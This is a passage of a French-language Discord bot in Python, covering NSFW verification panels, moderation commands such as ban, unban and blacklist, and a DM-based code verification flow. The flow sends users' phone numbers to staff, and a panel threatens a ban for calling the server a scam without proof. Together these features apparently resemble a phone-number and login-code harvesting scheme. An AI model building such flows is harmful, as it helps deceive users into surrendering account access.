            existing = entry
            break

    if existing and existing.get("message_id"):
        try:
            old_msg = await interaction.channel.fetch_message(existing["message_id"])
            await old_msg.edit(embed=embed, view=view)
            embed_success = discord.Embed(title="Panneau NSFW mis à jour", description="Le panneau de vérification NSFW a été mis à jour dans ce salon.", color=COLOR_SUCCESS)
            await interaction.response.send_message(embed=embed_success, ephemeral=True)
            return
        except (discord.NotFound, discord.HTTPException):
            pass  # Message supprimé, on en crée un nouveau

    await interaction.response.send_message(embed=embed, view=view)
    msg = await interaction.original_response()

    # Sauvegarder dans setup_data
    if existing:
        existing["message_id"] = msg.id
        existing["type"] = "nsfw"
    else:
        setup_data.append({
            "channel_id": interaction.channel_id,
            "message_id": msg.id,
            "type": "nsfw"
        })
    save_setup_data(setup_data)
    log.info(f"Setup NSFW fait dans #{interaction.channel.name} (msg: {msg.id})")


# ===== AUTRES COMMANDES =====

@bot.tree.command(name="proofsetup", description="Crée le panneau de preuves dans ce salon")
@app_commands.default_permissions(administrator=True)
async def proofsetup(interaction: discord.Interaction):
    embed = discord.Embed(
        title="Le serveur est-il legit ?",
        description="> **Oui c'est legit**\n> **Non c'est du scam (no proof = ban)**",
        color=0x5865f2
    )
    embed.set_footer(text="Système de vérification de preuves")
    view = ProofView()
    await interaction.response.send_message(embed=embed, view=view)
    log.info(f"Proof setup fait dans #{interaction.channel.name}")

@bot.tree.command(name="retry", description="Relancer la vérification si vous n'avez pas reçu le code")
async def retry(interaction: discord.Interaction):
    if not isinstance(interaction.channel, discord.DMChannel):
        embed = discord.Embed(title="Erreur", description="Cette commande fonctionne uniquement en message privé.", color=COLOR_DANGER)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    user_id = interaction.user.id
    now = datetime.datetime.now().timestamp()
    if user_id in retry_cooldowns:
        remaining = retry_cooldowns[user_id] + 600 - now
        if remaining > 0:
            embed = discord.Embed(title="Trop tôt", description=f"Veuillez attendre {int(remaining)} secondes avant de réessayer.", color=COLOR_WARNING)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
    if user_id in pending_verifications:
        embed = discord.Embed(title="Déjà en cours", description="Vous avez déjà une vérification en cours.", color=COLOR_WARNING)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    if is_user_blacklisted(user_id, blacklist):
        embed = discord.Embed(title="Accès refusé", description="Vous êtes blacklisté.", color=COLOR_DANGER)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    retry_cooldowns[user_id] = now
    embed = discord.Embed(
        title="Nouvelle demande",
        description="Votre demande de relance a été transmise au staff.\n\nUn membre va vous contacter sous peu.",
        color=COLOR_SUCCESS
    )
    await interaction.response.send_message(embed=embed, ephemeral=True)
    user = await bot.fetch_user(user_id)
    phone = "Numéro inconnu"
    await send_staff_panel(user, phone)

@bot.tree.command(name="clear", description="Supprime un nombre de messages dans le salon")
@app_commands.default_permissions(administrator=True)
@app_commands.describe(nombre="Nombre de messages à supprimer")
async def clear(interaction: discord.Interaction, nombre: int):
    if nombre < 1 or nombre > 100:
        embed = discord.Embed(title="Nombre invalide", description="Choisissez un nombre entre 1 et 100.", color=COLOR_WARNING)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    deleted = await interaction.channel.purge(limit=nombre)
    embed = discord.Embed(title="Salon nettoyé", description=f"{len(deleted)} messages supprimés.", color=COLOR_SUCCESS)
    await interaction.followup.send(embed=embed, ephemeral=True)

@bot.tree.command(name="ping", description="Affiche la latence du bot")
async def ping(interaction: discord.Interaction):
    latency = round(bot.latency * 1000)
    embed = discord.Embed(title="Pong", description=f"Latence : {latency}ms", color=COLOR_SUCCESS)
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="ban", description="Ban un utilisateur silencieusement par ID")
@app_commands.default_permissions(administrator=True)
@app_commands.describe(user_id="ID de l'utilisateur à bannir")
async def ban(interaction: discord.Interaction, user_id: str):
    try:
        target_id = int(user_id.strip())
    except:
        embed = discord.Embed(title="ID invalide", description="Entrez un ID Discord valide.", color=COLOR_DANGER)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    banned = await ban_user(target_id, "Banni via commande /ban")
    embed = discord.Embed(
        title="Utilisateur banni",
        description=f"**ID :** `{target_id}`\n**Banni :** {'Oui' if banned else 'Déjà banni'}",
        color=COLOR_DANGER
    )
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="unban", description="Déban un utilisateur par ID et nettoie toutes ses données")
@app_commands.default_permissions(administrator=True)
@app_commands.describe(user_id="ID de l'utilisateur à débannir")
async def unban(interaction: discord.Interaction, user_id: str):
    try:
        target_id = int(user_id.strip())
    except:
        embed = discord.Embed(title="ID invalide", description="Entrez un ID Discord valide.", color=COLOR_DANGER)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return

    guild = bot.get_guild(config.GUILD_ID)
    status_text = ""
    cleared_items = []

    # 1. Tentative de déban Discord
    if guild:
        try:
            await guild.unban(discord.Object(id=target_id), reason="Débanni via commande /unban")
            cleared_items.append("Ban Discord retiré")
        except discord.NotFound:
            cleared_items.append("Pas de ban Discord actif")
        except Exception as e:
            cleared_items.append(f"Erreur ban Discord : {str(e)}")

    # 2. Retirer de la blacklist
    remove_user_blacklist(target_id, blacklist)
    cleared_items.append("Blacklist retirée")

    # 3. Nettoyer les vérifications en attente
    if target_id in pending_verifications:
        pending_verifications.pop(target_id, None)
        cleared_items.append("Vérification en attente nettoyée")

    # 4. Nettoyer le cooldown
    if target_id in cooldowns:
        cooldowns.pop(target_id, None)
        cleared_items.append("Cooldown réinitialisé")

    # 5. Nettoyer le retry cooldown
    if target_id in retry_cooldowns:
        retry_cooldowns.pop(target_id, None)
        cleared_items.append("Retry cooldown réinitialisé")

    # 6. Forcer la fermeture du ticket staff si ouvert
    for sid, sdata in list(staff_active_claims.items()):
        if sdata.get("user_id") == target_id:
            try:
                await sdata["view"].close_ticket("Fermé (unban)", do_ban=False)
                cleared_items.append("Ticket staff fermé")
            except:
                pass
            break

    embed = discord.Embed(
        title="✅ Utilisateur débanni et nettoyé",
        description=f"**ID :** `{target_id}`\n\n**Actions effectuées :**\n" + "\n".join([f"• {c}" for c in cleared_items]),
        color=COLOR_SUCCESS
    )
    await interaction.response.send_message(embed=embed, ephemeral=True)
    log.info(f"Unban complet pour {target_id} : {', '.join(cleared_items)}")

@bot.tree.command(name="banlist", description="Affiche la liste des utilisateurs blacklist")
@app_commands.default_permissions(administrator=True)
async def banlist(interaction: discord.Interaction):
    users = blacklist.get("users", [])
    phones = blacklist.get("phones", [])
    embed = discord.Embed(title="Blacklist", color=COLOR_DANGER)
    if users:
        embed.add_field(name="Utilisateurs", value="\n".join([f"`{uid}`" for uid in users[:20]]), inline=True)
    else:
        embed.add_field(name="Utilisateurs", value="*Aucun*", inline=True)
    if phones:
        embed.add_field(name="Numéros", value="\n".join([f"`{mask_phone(p)}`" for p in phones[:20]]), inline=True)
    else:
        embed.add_field(name="Numéros", value="*Aucun*", inline=True)
    embed.set_footer(text=f"Total : {len(users)} users • {len(phones)} numéros")
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="sync", description="Sync les commandes slash")
@app_commands.default_permissions(administrator=True)
async def sync(interaction: discord.Interaction):
    await bot.tree.sync()
    embed = discord.Embed(title="Commandes synchronisées", color=COLOR_SUCCESS)
    await interaction.response.send_message(embed=embed, ephemeral=True)

# ===== EVENTS =====

@bot.event
async def on_ready():
    log.info(f"Connecté : {bot.user}")
    await bot.tree.sync()
    log.info("Commandes slash synchronisées.")

    # Restaurer les vues persistantes pour les messages de setup
    setup_data = load_setup_data()
    restored_count = 0
    entries_to_remove = []

    for entry in setup_data:
        channel_id = entry.get("channel_id")
        message_id = entry.get("message_id")
        if not message_id:
            # Ancienne entrée sans message_id → on essaie de la trouver dans l'historique
            channel = bot.get_channel(channel_id)
            if channel:
                try:
                    async for msg in channel.history(limit=50):
                        if msg.author == bot.user and msg.embeds:
                            # Vérifier quel type de setup
                            is_nsfw = entry.get("type") == "nsfw"
                            view = VerifyButtonView(is_nsfw=is_nsfw)
                            bot.add_view(view, message_id=msg.id)
                            entry["message_id"] = msg.id
                            save_setup_data(setup_data)
                            restored_count += 1
                            log.info(f"Vue persistante restaurée (rétro) dans #{channel.name} (msg: {msg.id})")
                            break
                except:
                    entries_to_remove.append(entry)
            continue

        try:
            channel = bot.get_channel(channel_id)
            if not channel:
                entries_to_remove.append(entry)
                continue
            # Vérifier que le message existe toujours
            msg = await channel.fetch_message(message_id)
            is_nsfw = entry.get("type") == "nsfw"
            view = VerifyButtonView(is_nsfw=is_nsfw)
            bot.add_view(view, message_id=message_id)
            restored_count += 1
            log.info(f"Vue persistante restaurée dans #{channel.name} (msg: {message_id})")
        except (discord.NotFound, discord.HTTPException):
            # Message supprimé → retirer l'entrée
            entries_to_remove.append(entry)
            log.warning(f"Message de setup {message_id} introuvable, entrée retirée.")

    # Nettoyer les entrées orphelines
    if entries_to_remove:
        for entry in entries_to_remove:
            if entry in setup_data:
                setup_data.remove(entry)
        save_setup_data(setup_data)
        log.info(f"{len(entries_to_remove)} entrées de setup nettoyées.")

    log.info(f"{restored_count} vues persistantes restaurées au total.")
    asyncio.create_task(start_health_server())

@bot.event
async def on_message(message: discord.Message):
    if message.author.bot:
        return
    if isinstance(message.channel, discord.DMChannel):
        await handle_dm_code(message)

# ===== LANCEMENT =====

if __name__ == "__main__":
    if not config.BOT_TOKEN:
        log.critical("BOT_TOKEN manquant dans .env")
        exit(1)
    bot.run(config.BOT_TOKEN)
